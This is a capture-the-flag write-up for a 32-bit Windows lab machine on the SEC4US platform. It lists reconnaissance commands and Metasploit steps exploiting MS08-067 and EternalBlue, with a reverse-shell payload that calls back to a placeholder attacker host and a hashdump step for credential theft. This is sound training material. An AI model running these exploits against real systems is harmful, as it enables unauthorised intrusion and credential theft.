# Maq142: Servidor Microsoft 32bits

Writeup for the **Servidor Microsoft 32bits** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 142

---

## Overview

A 32-bit Windows server with legacy vulnerabilities. The 32-bit architecture narrows the exploit selection, requiring payloads compatible with x86 targets.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
nmap -O [TARGET_IP]
```

Confirm the target is a 32-bit Windows system. Look for SMB (445), RPC (135), HTTP/IIS, and other Windows services.

```bash
crackmapexec smb [TARGET_IP]
```

## Exploitation

For a 32-bit Windows target, use the appropriate payload architecture:

**MS08-067 (NetAPI):**

```bash
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS [TARGET_IP]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
run
```

**MS17-010 (32-bit variant):**

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET_IP]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
run
```

Note: EternalBlue on 32-bit can be unstable. If it crashes the target, try auxiliary/admin/smb/ms17_010_command instead.

## Post-Exploitation

```
getuid
hashdump
search -f flag*
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploitation of Remote Services | T1210 |
| OS Credential Dumping | T1003 |

### CWE

- **CWE-120:** Buffer Copy without Checking Size of Input
- **CWE-787:** Out-of-bounds Write

---

Thirty-two bits of address space, thirty-two bits of nostalgia, and the same old buffer overflows that never learned to retire.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
